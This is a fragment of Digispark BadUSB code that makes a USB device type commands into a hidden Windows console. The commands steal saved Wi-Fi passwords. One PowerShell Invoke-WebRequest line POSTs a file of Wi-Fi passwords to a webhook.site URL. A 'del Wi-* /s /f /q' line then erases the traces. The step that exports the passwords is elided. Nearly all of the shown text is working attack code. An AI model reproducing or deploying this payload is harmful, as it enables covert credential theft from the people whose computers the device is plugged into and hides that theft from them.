...
void loop() {
  ...
  DigiKeyboard.println("cmd /k mode con: cols=45 lines=15"); //smallest cmd window possible
  DigiKeyboard.delay(700);
//  DigiKeyboard.println("powershell Set-WinUserLanguageList -LanguageList en-US, es-AR -Force");
...
//  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  ...
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/ca4c1d44-6aeb-414a-a85c-132ef74541e0 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Set-WinUserLanguageList -LanguageList es-AR, en-US -Force");
  DigiKeyboard.delay(1000);
